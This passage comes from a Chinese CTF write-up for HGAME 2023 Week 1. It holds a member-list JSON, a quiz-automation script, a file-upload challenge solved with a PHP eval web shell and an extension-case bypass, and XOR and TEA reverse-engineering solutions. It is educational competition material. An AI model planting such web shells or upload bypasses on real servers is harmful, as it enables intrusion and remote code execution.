&quot;0x4qE&quot;,<br>        &quot;intro&quot;: &quot;19级 / &amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Web&quot;,<br>        &quot;url&quot;: &quot;https://github.com/0x4qE&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;xi4oyu&quot;,<br>        &quot;intro&quot;: &quot;19级 / 骨瘦如柴的胖手&quot;,<br>        &quot;url&quot;: &quot;https://www.xi4oyu.top/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;R3n0&quot;,<br>        &quot;intro&quot;: &quot;19级 / bin底层选手&quot;,<br>        &quot;url&quot;: &quot;https://r3n0.top&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;m140&quot;,<br>        &quot;intro&quot;: &quot;19级 / 不会re / dl萌新 / 太弱小了，没有力量 / 想学游戏&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Mezone&quot;,<br>        &quot;intro&quot;: &quot;19级 / 普通的binary爱好者。&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;d1gg12&quot;,<br>        &quot;intro&quot;: &quot;19级 / 游戏开发 / 🐟粉&quot;,<br>        &quot;url&quot;: &quot;https://d1g.club&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Trotsky&quot;,<br>        &quot;intro&quot;: &quot;19级 / 半个全栈 / 安卓摸🐟 / P 社玩家 / 🍆粉&quot;,<br>        &quot;url&quot;: &quot;https://altonhe.github.io/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Gamison&quot;,<br>        &quot;intro&quot;: &quot;19级 / 挖坑不填的web选手&quot;,<br>        &quot;url&quot;: &quot;http://aw.gamison.top&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Tinmix&quot;,<br>        &quot;intro&quot;: &quot;19级会长 / DL爱好者 / web苦手&quot;,<br>        &quot;url&quot;: &quot;http://poi.ac&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;RT&quot;,<br>        &quot;intro&quot;: &quot;19级 / Re手，我手呢？&quot;,<br>        &quot;url&quot;: &quot;https://wr-web.github.io&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;wenzhuan&quot;,<br>        &quot;intro&quot;: &quot;18 级 / 完全不会安全 / 一个做设计的鸽子美工 / 天天画表情包&quot;,<br>        &quot;url&quot;: &quot;https://wzyxv1n.top/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Cosmos&quot;,<br>        &quot;intro&quot;: &quot;18级 / 莫得灵魂的开发 / 茄粉 / 作豚 /  米厨&quot;,<br>    <br>        &quot;url&quot;: &quot;https://cosmos.red&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Y&quot;,<br>        &quot;intro&quot;: &quot;18 级 / Bin / Win / 电竞缺乏视力 / 开发太菜 / 只会 C / CSGO 白给选手&quot;,<br>        &quot;url&quot;: &quot;https://blog.xyzz.ml:444/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Annevi&quot;,<br>        &quot;intro&quot;: &quot;18级 / 会点开发的退休web手 / 想学挖洞 / 混吃等死&quot;,<br>        &quot;url&quot;: &quot;https://annevi.cn&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;logong&quot;,<br>        &quot;intro&quot;: &quot;18 级 / 求大佬带我IoT入门 / web太难了只能做做misc维持生计 / 摸🐟&quot;,<br>        &quot;url&quot;: &quot;http://logong.vip&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Kevin&quot;,<br>        &quot;intro&quot;: &quot;18 级 / Web / 车万&quot;,<br>        &quot;url&quot;: &quot;https://harmless.blue/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;LurkNoi&quot;,<br>        &quot;intro&quot;: &quot;18级 / 会一丢丢crypto / 摸鱼&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;幼稚园&quot;,<br>        &quot;intro&quot;: &quot;18级会长 / 二进制安全 /  干拉&quot;,<br>        &quot;url&quot;: &quot;https://danisjiang.com&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;lostflower&quot;,<br>        &quot;intro&quot;: &quot;18级 / 游戏引擎开发 / 尚有梦想的game maker&quot;,<br>        &quot;url&quot;: &quot;https://r000setta.github.io&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Roc826&quot;,<br>        &quot;intro&quot;: &quot;18 级 / Web 底层选手&quot;,<br>        &quot;url&quot;: &quot;http://www.roc826.cn/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Seadom&quot;,<br>        &quot;intro&quot;: &quot;18 级 / Web / 真·菜到超乎想象 / 拼死学（mo）习（yu）中&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;ObjectNotFound&quot;,<br>        &quot;intro&quot;: &quot;18级 / 懂点Web &amp; Misc / 懂点运维 / 正在懂游戏引擎 / 我们联合！&quot;,<br>        &quot;url&quot;: &quot;https://www.zhouweitong.site&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Moesang&quot;,<br>        &quot;intro&quot;: &quot;18 级 / 不擅长 Web / 擅长摸鱼 / 摸鱼！&quot;,<br>        &quot;url&quot;: &quot;https://blog.wz22.cc&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;E99p1ant&quot;,<br>        &quot;intro&quot;: &quot;18级 / 囊地鼠饲养员 / 写了一个叫 Cardinal 的平台&quot;,<br>        &quot;url&quot;: &quot;https://github.red/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Michael&quot;,<br>        &quot;intro&quot;: &quot;18 级 / Java / 会除我佬&quot;,<br>        &quot;url&quot;: &quot;http://michaelsblog.top/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;matrixtang&quot;,<br>        &quot;intro&quot;: &quot;18级 / 编译器工程师( 伪 / 半吊子PL- 静态分析方向&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;r4u&quot;,<br>        &quot;intro&quot;: &quot;18级 / 不可以摸🐠哦&quot;,<br>        &quot;url&quot;: &quot;http://r4u.top/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;357&quot;,<br>        &quot;intro&quot;: &quot;18级 / 并不会web / 端茶送水选手&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Li4n0&quot;,<br>        &quot;intro&quot;: &quot;17 级 / Web 安全爱好者 / 半个程序员 / 没有女朋友&quot;,<br>        &quot;url&quot;: &quot;https://blog.0e1.top&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;迟原静&quot;,<br>        &quot;intro&quot;: &quot;17级 / Focus on Java Security&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Ch1p&quot;,<br>        &quot;intro&quot;: &quot;17 级 / 自称 Bin 手实际啥都不会 / 二次元安全&quot;,<br>        &quot;url&quot;: &quot;http://ch1p.top&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;f1rry&quot;,<br>        &quot;intro&quot;: &quot;17 级 / Web&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;mian&quot;,<br>        &quot;intro&quot;: &quot;17 级 / 业余开发 / 专业摸鱼&quot;,<br>        &quot;url&quot;: &quot;https://www.intmian.com&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;ACce1er4t0r&quot;,<br>        &quot;intro&quot;: &quot;17级 / 摸鱼ctfer / 依旧在尝试入门bin / 菜鸡研究生+1&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;MiGo&quot;,<br>        &quot;intro&quot;: &quot;17级 / 二战人 / 老二次元 / 兴趣驱动生活&quot;,<br>        &quot;url&quot;: &quot;https://migoooo.github.io/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;BrownFly&quot;,<br>        &quot;intro&quot;: &quot;17级 / RedTeamer / 字节跳动安全工程师&quot;,<br>        &quot;url&quot;: &quot;https://brownfly.github.io&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Aris&quot;,<br>        &quot;intro&quot;: &quot;17级/ Key厨 / 腾讯玄武倒水的&quot;,<br>        &quot;url&quot;: &quot;https://blog.ar1s.top&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;hsiaoxychen&quot;,<br>        &quot;intro&quot;: &quot;17级 / 游戏厂打工仔 / 来深圳找我快活&quot;,<br>        &quot;url&quot;: &quot;https://chenxy.me&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Lou00&quot;,<br>        &quot;intro&quot;: &quot;17级 / web / 东南读研&quot;,<br>        &quot;url&quot;: &quot;https://blog.lou00.top&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Junier&quot;,<br>        &quot;intro&quot;: &quot;16 级 / 立志学术的统计er / R / 为楼上的脱单事业做出了贡献&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;bigmud&quot;,<br>        &quot;intro&quot;: &quot;16 级会长 / Web 后端 / 会一点点 Web 安全 / 会一丢丢二进制&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;NeverMoes&quot;,<br>        &quot;intro&quot;: &quot;16 级 / Java 福娃 / 上班 996 / 下班 669&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Sora&quot;,<br>        &quot;intro&quot;: &quot;16 级 / Web Developer&quot;,<br>        &quot;url&quot;: &quot;https://github.com/Last-Order&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;fantasyqt&quot;,<br>        &quot;intro&quot;: &quot;16 级 / 可能会运维 / 摸鱼选手&quot;,<br>        &quot;url&quot;: &quot;http://0x2f.xyz&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;vvv_347&quot;,<br>        &quot;intro&quot;: &quot;16 级 / Rev / Windows / Freelancer&quot;,<br>        &quot;url&quot;: &quot;https://vvv-347.space&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;veritas501&quot;,<br>        &quot;intro&quot;: &quot;16 级 / Bin / 被迫研狗&quot;,<br>        &quot;url&quot;: &quot;https://veritas501.space&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;LuckyCat&quot;,<br>        &quot;intro&quot;: &quot;16 级 / Web 🐱 / 现于长亭科技实习&quot;,<br>        &quot;url&quot;: &quot;https://jianshu.com/u/ad5c1e097b84&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Ash&quot;,<br>        &quot;intro&quot;: &quot;16 级 / Java 开发攻城狮 / 996 选手 / 濒临猝死&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Cyris&quot;,<br>        &quot;intro&quot;: &quot;16 级 / Web 前端 / 美工 / 阿里云搬砖&quot;,<br>        &quot;url&quot;: &quot;https://cyris.moe/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Acaleph&quot;,<br>        &quot;intro&quot;: &quot;16 级 / Web 前端 / 水母一小只 / 程序员鼓励师 / Cy 来组饥荒！&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;b0lv42&quot;,<br>        &quot;intro&quot;: &quot;16级 / 大果子 / 毕业1年仍在寻找vidar娘接盘侠&quot;,<br>        &quot;url&quot;: &quot;https://b0lv42.github.io/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;ngc7293&quot;,<br>        &quot;intro&quot;: &quot;16 级 / 蟒蛇饲养员 / 高数小王子&quot;,<br>        &quot;url&quot;: &quot;https://ngc7292.github.io/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;ckj123&quot;,<br>        &quot;intro&quot;: &quot;16 级 / Web / 菜鸡第一人&quot;,<br>        &quot;url&quot;: &quot;https://www.ckj123.com&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;cru5h&quot;,<br>        &quot;intro&quot;: &quot;16级 / 前web手、现pwn手 / 菜鸡研究生 / scu&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;xiaoyao52110&quot;,<br>        &quot;intro&quot;: &quot;16 级 / Bin 打杂 / 他们说菜都是假的，我是真的&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Undefinedv&quot;,<br>        &quot;intro&quot;: &quot;15 级网安协会会长 / Web 安全&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Spine&quot;,<br>        &quot;intro&quot;: &quot;逆向 / 二进制安全&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Tata&quot;,<br>        &quot;intro&quot;: &quot;二进制 CGC 入门水准 / 半吊子爬虫与反爬虫&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Airbasic&quot;,<br>        &quot;intro&quot;: &quot;Web 安全 / 长亭科技安服部门 / TSRC 2015 年年度英雄榜第八、2016 年年度英雄榜第十三&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;jibo&quot;,<br>        &quot;intro&quot;: &quot;15 级 / 什么都不会的开发 / 打什么都菜&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Processor&quot;,<br>        &quot;intro&quot;: &quot;15 级 Vidar 会长 / 送分型逆向选手 / 13 段剑纯 / 差点没毕业 / 阿斯巴甜有点甜&quot;,<br>        &quot;url&quot;: &quot;https://processor.pub/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;HeartSky&quot;,<br>        &quot;intro&quot;: &quot;15 级 / 挖不到洞 / 打不动 CTF / 内网渗透不了 / 工具写不出&quot;,<br>        &quot;url&quot;: &quot;http://heartsky.info&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Minygd&quot;,<br>        &quot;intro&quot;: &quot;15 级 / 删库跑路熟练工 / 没事儿拍个照 / 企鹅&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Yotubird&quot;,<br>        &quot;intro&quot;: &quot;15 级 / 已入 Python 神教&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;c014&quot;,<br>        &quot;intro&quot;: &quot;15 级 / Web 🐶 / 汪汪汪&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Explorer&quot;,<br>        &quot;intro&quot;: &quot;14 级 HDUISA 会长 / 二进制安全 / 曾被 NULL、TD、蓝莲花等拉去凑人数 / 差点没毕业 / 长亭安研&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Aklis&quot;,<br>        &quot;intro&quot;: &quot;14 级 HDUISA 副会长 / 二次元 / 拼多多安全工程师&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Sysorem&quot;,<br>        &quot;intro&quot;: &quot;14 级网安协会会长 / HDUISA 成员 / Web 安全 / Freebuf 安全社区特约作者 / FSI2015Freebuf 特邀嘉宾&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Hcamael&quot;,<br>        &quot;intro&quot;: &quot;13 级 / 知道创宇 404 安全研究员 / 现在 Nu1L 划划水 / IoT、Web、二进制漏洞，密码学，区块链都看得懂一点，但啥也不会&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;LoRexxar&quot;,<br>        &quot;intro&quot;: &quot;14 级 / Web 🐶 / 杭电江流儿 / 自走棋主教守门员&quot;,<br>        &quot;url&quot;: &quot;https://lorexxar.cn/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;A1ex&quot;,<br>        &quot;intro&quot;: &quot;14 级网安协会副会长 / Web 安全&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Ahlaman&quot;,<br>        &quot;intro&quot;: &quot;14 级网安协会副会长 / 无线安全&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;lightless&quot;,<br>        &quot;intro&quot;: &quot;Web 安全 / 安全工程师 / 半吊子开发 / 半吊子安全研究&quot;,<br>        &quot;url&quot;: &quot;https://lightless.me/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Edward_L&quot;,<br>        &quot;intro&quot;: &quot;13 级 HDUISA 会长 / Web 安全 / 华为安全部门 / 二进制安全，fuzz，符号执行方向研究&quot;,<br>        &quot;url&quot;: &quot;#&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;逆风&quot;,<br>        &quot;intro&quot;: &quot;13 级菜鸡 / 大数据打杂&quot;,<br>        &quot;url&quot;: &quot;https://github.com/deadwind4&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;陈斩仙&quot;,<br>        &quot;intro&quot;: &quot;什么都不会 / 咸鱼研究生 / &lt;del&gt;安恒&lt;/del&gt;、&lt;del&gt;长亭&lt;/del&gt; / SJTU&quot;,<br>        &quot;url&quot;: &quot;https://mxgcccc4.github.io/&quot;<br>    &#125;,<br>    &#123;<br>        &quot;id&quot;: &quot;Eric&quot;,<br>        &quot;intro&quot;: &quot;渗透 / 人工智能 / 北师大博士在读&quot;,<br>        &quot;url&quot;: &quot;https://3riccc.github.io&quot;<br>    &#125;<br>]<br><br>header=&#123;<br>&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;,<br># &quot;Cookie&quot;: &quot;session=MTY3Mjk3MDg0NnxEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQTBBQzJOb1lXeHNaVzVuWlVsa0EybHVkQVFDQUdBR2MzUnlhVzVuREFnQUJuTnZiSFpsWkFOcGJuUUVBZ0FJfHQLh9i1t9G1Z55UTrzz_ww-Y6n6uB4kkXRDHlwIBQKi&quot;,<br>&quot;Accept&quot;:&quot;application/json, text/plain, */*&quot;,<br>&quot;Connection&quot;:&quot;keep-alive&quot;&#125;<br><br>url=&quot;http://week-1.hgame.lwsec.cn:30604/&quot;<br><br>s =requests.Session()<br><br>r=s.get(url,headers=header)<br>r=s.get(url+&#x27;api/getQuestion&#x27;,headers=header)<br>for i in r.cookies:<br>    print(i.value)<br>for i in range(100):<br>    r = s.get(url+&#x27;api/getQuestion&#x27;,headers=header)<br>    for x in js:<br>        dsc=json.loads(r.text)[&quot;message&quot;]<br>        if x[&quot;intro&quot;]==dsc:<br>            data=&#123;&#x27;id&#x27;:x[&#x27;id&#x27;]&#125;<br>            res=s.post(url+&#x27;api/verifyAnswer&#x27;,headers=header,data=data)<br>            res=s.get(url+&#x27;api/getScore&#x27;,headers=header)<br>            print(res.text)<br>            break<br>header=&#123;<br>&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;,<br># &quot;Cookie&quot;: &quot;session=MTY3Mjk3MDg0NnxEdi1CQkFFQ180SUFBUkFCRUFBQU9fLUNBQUlHYzNSeWFXNW5EQTBBQzJOb1lXeHNaVzVuWlVsa0EybHVkQVFDQUdBR2MzUnlhVzVuREFnQUJuTnZiSFpsWkFOcGJuUUVBZ0FJfHQLh9i1t9G1Z55UTrzz_ww-Y6n6uB4kkXRDHlwIBQKi&quot;,<br>&quot;Accept&quot;:&quot;application/json, text/plain, */*&quot;,<br>&quot;Connection&quot;:&quot;keep-alive&quot;,<br>&quot;Content-Type&quot;:&quot;text/html; charset=utf-8&quot;&#125;<br><br>r=s.get(url,headers=header)<br>print(r.text)<br></code></pre></td></tr></table></figure>    </div></div><h2 id="Show-Me-Your-Beauty"><a href="#Show-Me-Your-Beauty" class="headerlink" title="Show Me Your Beauty"></a>Show Me Your Beauty</h2><h3 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/18.png"></p><ul><li>题目描述<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/19.png"></li><li>主页</li></ul><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><ul><li><p>根据描述可知，是个文件上传类的</p></li><li><p>上传php木马,文件后缀修改为jpg绕过前端检查</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>fiddler 抓包修改文件后缀为pHp成功上传<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/20.png"></p></li><li><p>上传成功后会响应路径<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/21.png"></p></li><li><p>最后用蚁剑连接get shell<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/23.png"><br><img src="/2023/01/12/HGAME-2023-Week1-Wp/22.png"></p></li></ul><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="test-your-IDA"><a href="#test-your-IDA" class="headerlink" title="test your IDA"></a>test your IDA</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><ul><li>签到题</li></ul><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><ul><li>拖进IDA直接看到flag<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/24.png"></li></ul><h2 id="easyasm"><a href="#easyasm" class="headerlink" title="easyasm"></a>easyasm</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><ul><li>直接给了汇编txt<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs asm">; void __cdecl enc(char *p)<br>.text:00401160 _enc            proc near               ; CODE XREF: _main+1B↑p<br>.text:00401160<br>.text:00401160 i               = dword ptr -4<br>.text:00401160 Str             = dword ptr  8<br>.text:00401160<br>.text:00401160                 push    ebp<br>.text:00401161                 mov     ebp, esp<br>.text:00401163                 push    ecx<br>.text:00401164                 mov     [ebp+i], 0<br>.text:0040116B                 jmp     short loc_401176<br>.text:0040116D ; ---------------------------------------------------------------------------<br>.text:0040116D<br>.text:0040116D loc_40116D:                             ; CODE XREF: _enc+3B↓j<br>.text:0040116D                 mov     eax, [ebp+i]<br>.text:00401170                 add     eax, 1<br>.text:00401173                 mov     [ebp+i], eax<br>.text:00401176<br>.text:00401176 loc_401176:                             ; CODE XREF: _enc+B↑j<br>.text:00401176                 mov     ecx, [ebp+Str]<br>.text:00401179                 push    ecx             ; Str<br>.text:0040117A                 call    _strlen<br>.text:0040117F                 add     esp, 4<br>.text:00401182                 cmp     [ebp+i], eax<br>.text:00401185                 jge     short loc_40119D<br>.text:00401187                 mov     edx, [ebp+Str]<br>.text:0040118A                 add     edx, [ebp+i]<br>.text:0040118D                 movsx   eax, byte ptr [edx]<br>.text:00401190                 xor     eax, 33h<br>.text:00401193                 mov     ecx, [ebp+Str]<br>.text:00401196                 add     ecx, [ebp+i]<br>.text:00401199                 mov     [ecx], al<br>.text:0040119B                 jmp     short loc_40116D<br>.text:0040119D ; ---------------------------------------------------------------------------<br>.text:0040119D<br>.text:0040119D loc_40119D:                             ; CODE XREF: _enc+25↑j<br>.text:0040119D                 mov     esp, ebp<br>.text:0040119F                 pop     ebp<br>.text:004011A0                 retn<br>.text:004011A0 _enc            endp<br>Input: your flag<br>Encrypted result: 0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e<br></code></pre></td></tr></table></figure></li></ul><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><ul><li>逻辑是对输入进行了异或，直接帖exp</li></ul><h3 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python3">cmp=[0x5b,0x54,0x52,0x5e,0x56,0x48,0x44,0x56,0x5f,0x50,0x3,0x5e,0x56,0x6c,0x47,0x3,0x6c,0x41,0x56,0x6c,0x44,0x5c,0x41,0x2,0x57,0x12,0x4e]<br>flag=&quot;&quot;<br>for i in cmp:<br>    flag+=chr((i^0x33)&amp;0xff)<br>print(flag)<br></code></pre></td></tr></table></figure><h2 id="easyenc"><a href="#easyenc" class="headerlink" title="easyenc"></a>easyenc</h2><h3 id="分析-6"><a href="#分析-6" class="headerlink" title="分析"></a>分析</h3><p><img src="/2023/01/12/HGAME-2023-Week1-Wp/25.png"></p><ul><li>对输入异或了0x32再减86</li></ul><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><ul><li>直接逆,比较的数据在栈上，直接动调拿</li></ul><h3 id="Exp-2"><a href="#Exp-2" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python3">cmp=[0x04, 0xFF, 0xFD, 0x09, 0x01, 0xF3, 0xB0, 0x00, 0x00, 0x05, 0xF0, 0xAD, 0x07, 0x06, 0x17, 0x05, 0xEB, 0x17, 0xFD, 0x17, 0xEA, 0x01, 0xEE, 0x01, 0xEA, 0xB1, 0x05, 0xFA, 0x08, 0x01, 0x17, 0xAC, 0xEC, 0x01, 0xEA, 0xFD, 0xF0, 0x05, 0x07, 0x06, 0xF9]<br>flag=&quot;&quot;<br>for x in cmp:<br>    flag+=chr(((x+86)^0x32)&amp;0xff)<br>print(flag)<br></code></pre></td></tr></table></figure><h2 id="a-cup-of-tea"><a href="#a-cup-of-tea" class="headerlink" title="a_cup_of_tea"></a>a_cup_of_tea</h2><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><ul><li>看名字知道是Tea<br><img src="/2023/01/12/HGAME-2023-Week1-Wp/26.png"><br><img src="/2023/01/12/HGAME-2023-Week1-Wp/27.png"></li><li>对输入的四个部分都进行了tea加密</li></ul><h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><ul><li>直接拿比较数据，分成四个部分逆</li></ul><h3 id="Exp-3"><a href="#Exp-3" class="headerlink" title="Exp"></a>Exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 